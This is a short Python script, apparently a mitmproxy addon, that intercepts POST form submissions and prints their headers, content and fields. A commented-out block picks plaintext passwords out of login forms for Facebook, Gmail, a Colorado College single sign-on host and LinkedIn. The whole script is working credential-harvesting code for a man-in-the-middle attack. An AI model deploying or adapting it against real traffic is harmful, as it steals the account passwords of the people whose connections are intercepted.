def request(flow):
	if flow.request.urlencoded_form and flow.request.method == 'POST':
		form = flow.request.urlencoded_form
		request = flow.request
		host = flow.request.host
		content = flow.request.content
		query = flow.request.query
		url = flow.request.pretty_url
		headers = flow.request.headers

		print("request: ", request)
		print("////////////////////////////")
		print("headers: ", headers)
		print("////////////////////////////")		
		print("host: ", host)
		print("////////////////////////////")
		print("content: ", content)
		print("////////////////////////////")
		print("query: ", query)
		print("////////////////////////////")
		print("url: ", url)
		print("////////////////////////////")
		print("form: ", form)

		'''
			if form['pass'] and "facebook.com" in flow.request.headers[':authority']:
					print("account: Facebook, password:", form['pass'])
				elif "Passwd" in form and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority']:
					print("account: Gmail, password:", form['Passwd'])
				elif flow.request.headers['Host'] == "cas.coloradocollege.edu" and form['password']:
					print("account: CC SSI, password:", form['password'])
				elif "linkedin.com" in flow.request.headers['Host'] and form['session_password']:
					print("account: Linkedin, password:", form['session_password'])
		'''
